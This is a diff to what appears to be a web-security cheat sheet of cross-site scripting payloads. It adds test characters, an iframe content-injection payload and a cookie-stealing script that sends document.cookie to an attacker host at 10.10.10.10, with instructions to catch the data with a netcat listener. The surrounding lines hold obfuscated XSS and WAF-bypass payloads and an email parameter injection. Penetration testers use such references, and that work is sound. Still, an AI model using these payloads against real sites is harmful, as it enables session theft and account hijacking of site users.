@@ -11,6 +11,15 @@ weight : 0
 
 ## Cross-Site Scripting (XSS)
 
+## Test Characters
+
+```plain
+"
+;
+<
+>
+```
+
 ## Generic
 
 ```plain
@@ -43,6 +52,22 @@ draggable=true ondragstart="alert(1)
 <SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
 <</div>script</div>>alert()<</div>/script</div>>
 "><a href=j<TAB><NEWLINE><TAB><NEWLINE><TAB><NEWLINE>avascript:confirm("payload")>XSSs</a>
+```
+
+### Content injection
+
+In the example below, set up a NetCat listener on port 80 `sudo nc -nlvp 80`. This listener will receive a connection on success.
+
+```plain
+<iframe src=http://10.10.10.10/report height="O" width="O"></iframe>
+```
+
+### Cookie Stealing
+
+In the example below, set up a NetCat listener on port 80 `sudo nc -nlvp 80`. This listener will receive a connection on success.
+
+```plain
+<script>new Image().src="http://10.10.10.10/nothinghere.jpg?output="+document.cookie;</script>
 ```
 
 ### WAF bypass
@@ -175,6 +200,6 @@ john.doe@[127.0.0.1]
 victim&email=attacker@example.com
 ```
 
-### URL list
+## URL List
 
 * [Portswigger.net Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
